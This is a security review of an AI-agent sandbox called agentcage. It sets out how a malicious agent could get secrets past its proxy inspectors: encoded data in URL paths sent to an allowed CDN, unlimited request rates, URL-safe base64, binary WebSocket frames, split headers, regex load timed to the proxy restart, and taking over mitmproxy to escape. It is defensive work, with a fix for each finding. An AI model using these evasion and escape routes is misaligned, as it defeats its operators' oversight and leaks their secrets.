# Security Review — February 2026

Review of the agentcage codebase from the perspective of a compromised or malicious AI agent — the primary threat actor in agentcage's threat model.

## Threat Model

The agent holds the [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/): internet access (mediated), secrets (via placeholders), and arbitrary code execution. The config file is written by the operator (the defender) and is trusted. The question is: **what can the agent do to exfiltrate data, steal secrets, or escape isolation?**

## Scope

- Proxy addon, inspectors, and secret injector (`data/proxy/`)
- Container and VM hardening (quadlet templates, Lima VM provisioning)
- Network isolation (Podman internal network, Lima networking, dnsmasq)
- Secret lifecycle (injection, redaction, storage)

---

## Findings

### HIGH — H1: URL path segments bypass entropy and content-type inspection

**Files:** `data/proxy/inspectors/entropy.py:116-147`, `data/proxy/inspectors/content_type.py:51-99`

The entropy inspector checks request **bodies** and **query parameter values**, but not URL **path segments**. The content-type inspector only examines bodies. An agent can encode exfiltrated data directly in the URL path of a request to an allowed domain:

```
GET https://cdn.jsdelivr.net/AAAA<base64-encoded-secret>AAAA/package.json
```

- Domain inspector: passes (allowed domain)
- Entropy inspector: skips the path, only checks `?key=value` params
- Secrets inspector: only matches if data looks like a known key format
- Content-type inspector: no body to inspect

The entropy inspector's `_check_url_params()` explicitly parses `parse_qs(parsed.query)` but never examines `parsed.path`. URL paths can carry hundreds of bytes per request, and the agent controls the encoding to stay under the query param entropy threshold (5.5).

**Impact:** Reliable exfiltration channel at ~200 bytes/request through any allowed domain. With rate limiting off (see H2), throughput is limited only by network speed.

**Mitigation:** Add `_check_url_path()` to the entropy inspector that computes entropy on each `/`-delimited path segment longer than `url_min_value_bytes`.

---

### HIGH — H2: Rate limiting disabled by default

**File:** `data/proxy/addon.py:66-67`

```python
self._rl_rate: float = float(rl_cfg.get("requests_per_second", 0))
```

A rate of 0 disables rate limiting entirely. Combined with H1, an agent can make thousands of requests per second to exfiltrate data through URL paths, query parameters, or multi-request splitting — all documented as difficult to detect without rate bounds.

The multi-request evasion limitation documented in `security.md` ("An agent could split a secret across many requests") becomes trivially exploitable when there is no rate limit. GTG-1002 is cited as a real-world example of autonomous multi-step exfiltration.

**Impact:** Unbounded exfiltration throughput through any allowed domain via splitting, URL-path encoding, or header stuffing.

**Mitigation:** Enable a default rate limit (e.g., 10 req/s, burst 50). The operator can raise it for high-throughput workloads. Document that disabling rate limiting significantly weakens multi-request evasion defenses.

---

### HIGH — H3: Agent can DoS the proxy to mask exfiltration in recovery window

**File:** `data/proxy/inspectors/secrets.py:100-102`

The secrets inspector scans `[ctx.url, str(ctx.headers), ctx.body_text]` for every request. The regex patterns have no upper-bound quantifiers (`{20,}`, `{36,}`, `{50,}`). An agent can craft a request with a multi-megabyte body containing a near-miss prefix (e.g., `"sk-ant-" + "a" * 10_000_000`) to force a long linear scan against every pattern.

With 19 built-in patterns and 3 targets per request, a 10MB body triggers ~57 regex scans. While Python's `re` module handles the simple quantifiers in linear time (no catastrophic backtracking), the aggregate CPU cost is significant — especially if the agent sends many such requests concurrently.

Fail-closed design means a hung proxy = no connectivity (not unfiltered access), so this doesn't directly enable exfiltration. However:
- The proxy restarts via `Restart=on-failure`
- During the restart window, queued requests are dropped
- An agent could time a legitimate-looking exfiltration request to coincide with recovery

This is speculative and low-probability, but the unbounded quantifiers have no upside.

**Mitigation:** Add upper bounds to all regex quantifiers (e.g., `{20,200}`). The body-size inspector already limits total body size, but runs independently — consider checking body size before regex scanning within the secrets inspector itself.

---

### MEDIUM — M1: URL-safe base64 evades content-type inspector

**File:** `data/proxy/inspectors/content_type.py:27`

```python
_BASE64_RE = re.compile(r"^[A-Za-z0-9+/=\s]{64,}$", re.MULTILINE)
```

This regex matches standard base64 (`+/=`) but not URL-safe base64 (`-_`). An agent can encode exfiltrated data using URL-safe base64 in a JSON body:

```json
{"data": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_..."}
```

The content-type inspector will not flag this as a base64 blob. The entropy inspector may catch it if entropy exceeds 7.0 (base64 typically ~6.0), but the content-type inspector's entropy ceiling is 6.5 — so base64 with entropy between 6.0 and 6.5 passes both.

**Impact:** Agent can embed encoded data in JSON bodies to allowed API endpoints without triggering base64 detection.

**Mitigation:** Extend the regex character class: `[A-Za-z0-9+/=\-_\s]{64,}`.

---

### MEDIUM — M2: Binary WebSocket frames partially evade text-based secret detection

**File:** `data/proxy/addon.py:312-313`

```python
body_text = content.decode("utf-8", errors="replace") if isinstance(content, bytes) else content
```

Binary WebSocket frames are decoded with `errors="replace"`, inserting U+FFFD replacement characters where bytes are not valid UTF-8. If a secret is encoded in a binary protocol or non-UTF-8 charset, the replacement characters break the pattern and the secrets inspector misses it.

Entropy inspection operates on raw `body_bytes` and is unaffected. ASCII-based secret patterns (like `sk-ant-...`) survive decoding intact because they are valid UTF-8.

**Impact:** Agent can exfiltrate non-ASCII-encoded data through WebSocket binary frames without triggering secret pattern detection. Entropy detection still applies.

**Mitigation:** For binary frames with high entropy, consider blocking or flagging regardless of text pattern matches. Alternatively, also scan the hex representation of the raw bytes.

---

### MEDIUM — M3: Entropy gap between base64 and encrypted data

**Files:** `data/proxy/inspectors/entropy.py:54,66`, `data/proxy/inspectors/content_type.py:46`

The entropy inspector's default body threshold is 7.0. The content-type inspector's entropy ceiling is 6.5. Base64-encoded text has entropy ~6.0. This creates a gap:

- Entropy < 6.5: passes both inspectors
- Entropy 6.5–7.0: blocked by content-type inspector (if text CT declared), passes entropy inspector
- Entropy > 7.0: blocked by entropy inspector

An agent can encode data at ~6.0 entropy (standard base64 of compressible text) and it passes the entropy inspector entirely. The content-type inspector catches base64 blobs via regex, but only for standard encoding (see M1) and only for text content types — if the agent declares `application/octet-stream`, the content-type inspector returns `None` at line 60 without checking anything.

**Impact:** Agent can encode data at entropy ~6.0 with a non-text Content-Type to evade both inspectors.

**Mitigation:** Consider lowering the entropy threshold to 6.0 for non-exempt content types, or running the base64 blob regex on all content types (not just text-like ones).

---

### MEDIUM — M4: Secrets inspector scans `str(ctx.headers)` — fragile header inspection

**File:** `data/proxy/inspectors/secrets.py:96`

```python
targets = [ctx.url, str(ctx.headers)]
```

Headers are converted to their dict `__repr__` string for scanning. This works for simple cases but the format is `{'Key': 'Value', ...}`, which means:
- Multi-value headers are collapsed
- The pattern match must span the repr-formatted string, not raw header values
- An agent could split a secret across multiple headers (e.g., `X-A: sk-ant-` and `X-B: api123...`) to break the regex match

**Impact:** Low — the existing patterns are short prefixes that would appear entirely within a single header value. But custom patterns that match longer strings could be broken by the repr formatting.

**Mitigation:** Iterate over individual header values and scan each separately, rather than converting the dict to a string.

---

### MEDIUM — M5: mitmproxy itself is attack surface for proxy process compromise

**File:** `data/proxy/addon.py` (mitmproxy dependency)

The agent's HTTP traffic is parsed and inspected by mitmproxy. A vulnerability in mitmproxy's HTTP parser, TLS implementation, or WebSocket handling could allow the agent to execute code in the proxy process. The proxy process holds:
- Real secret values (loaded from environment for injection)
- Network access to the external internet
- The mitmproxy CA private key

A proxy compromise would give the agent unmediated internet access with real secrets — a complete bypass of all defenses.

**Impact:** Complete sandbox escape if a mitmproxy CVE is exploitable from the agent side. This is the highest-value target for a sophisticated agent.

**Mitigation:** This is inherent to the architecture (traffic must be parsed to be inspected). Reduce blast radius by:
1. Keep mitmproxy pinned and update promptly on CVEs (currently digest-pinned — good).
2. In VM mode, the proxy runs inside the Lima VM, so a compromise is contained by the VM boundary.
3. Consider running the proxy with seccomp and restricted capabilities (currently runs as `mitmproxy` user — good, but no seccomp profile).

---

### LOW — L1: Response redaction only handles plaintext encoding

**File:** `data/proxy/secret_injector.py:207-223`

Response redaction searches for `real_value.encode()` in `flow.response.content`. If an upstream API echoes a secret in a different encoding (URL-encoded, base64, HTML-entity-encoded), the redaction misses it and the agent sees the real secret.

Example: the agent sends `{{ANTHROPIC_API_KEY}}` to `api.anthropic.com`. The proxy injects the real key. The API responds with the key URL-encoded in an error message: `invalid%20key%3A%20sk-ant-...`. The redaction looks for the raw bytes of the key but misses the URL-encoded version.

**Impact:** Agent could learn real secret values from API responses that echo credentials in non-plaintext encodings. Requires the upstream API to echo the key, which most APIs don't do.

**Mitigation:** Additionally scan for URL-encoded and base64-encoded variants of each real value during redaction.

---

### LOW — L2: *(resolved)* VM base image pinning

Previously the Firecracker `Containerfile.vmbase` used tag-pinned `fedora-minimal:45`. This file has been removed as part of the migration to Lima VM mode, which manages its own base image. The Lima VM backend does not use a custom rootfs Containerfile.

---

## Security Positives

These design choices significantly raise the bar for agent exfiltration:

- **Fail-closed network.** `--internal` network with no gateway. Proxy failure = no connectivity, not bypass. The agent cannot reach the internet without the proxy.
- **Inspector-before-injection ordering.** Inspectors see placeholders, not real secrets (`addon.py:229`). Real values are only injected after the full inspector chain approves the request. This prevents the inspectors from leaking secrets in block/flag messages.
- **Secret injection domain restrictions.** A placeholder sent to an unauthorized domain is blocked before inspection (`addon.py:213-214`). The agent cannot redirect secrets to attacker infrastructure.
- **Entropy inspection on raw bytes.** The entropy inspector operates on `body_bytes`, not decoded text, making encoding-based evasion harder for body payloads.
- **URL parameter entropy checking.** Query parameter values are individually checked against `url_threshold` (5.5), catching high-entropy data in URLs.
- **WebSocket frame inspection.** The full inspector chain runs on every WebSocket message, not just the handshake. Frames can be dropped mid-stream.
- **DNS filtering.** Non-allowlisted domains get a placeholder IP (198.51.100.1), preventing DNS-level reconnaissance. DNS exfiltration of allowlisted subdomains is a documented residual risk.
- **Container hardening defaults.** Read-only rootfs, all caps dropped, no-new-privileges — all on by default.
- **Lima VM boundary.** In VM mode, a container escape lands inside the Lima VM. The proxy compromise risk (M5) is contained — the proxy runs inside the VM, so even a compromised proxy only has internet access through the VM's network stack managed by Lima.

---

## Mitigation Plan

### P0 — Closes concrete exfiltration channels

| ID | Finding | Fix | Files |
|----|---------|-----|-------|
| H1 | URL path entropy bypass | Add `_check_url_path()` — entropy-check each path segment above a length threshold | `inspectors/entropy.py` |
| H2 | Rate limiting off by default | Default to 10 req/s burst 50; document opt-out | `addon.py`, `docs/configuration.md` |

### P1 — Hardens existing inspection

| ID | Finding | Fix | Files |
|----|---------|-----|-------|
| H3 | Regex DoS / unbounded quantifiers | Add upper bounds (`{20,200}`) to all secret patterns | `inspectors/secrets.py` |
| M1 | URL-safe base64 evasion | Extend `_BASE64_RE` to include `-_` | `inspectors/content_type.py` |
| M3 | Entropy gap with non-text CT | Run base64 blob regex on all content types, not just text-like | `inspectors/content_type.py` |
| M4 | Header scanning via `str()` | Iterate and scan individual header values | `inspectors/secrets.py` |

### P2 — Defense in depth

| ID | Finding | Fix | Files |
|----|---------|-----|-------|
| M2 | Binary WS text evasion | Block or flag binary frames above entropy threshold regardless of text pattern match | `addon.py` |
| M5 | mitmproxy as attack surface | Add seccomp profile to proxy container; document update cadence | `templates/proxy.container.j2`, docs |
| L1 | Response redaction encoding gap | Scan for URL-encoded and base64 variants during redaction | `secret_injector.py` |
| L2 | vmbase tag pinning | Pin to `@sha256:...` digest | `Containerfile.vmbase` |
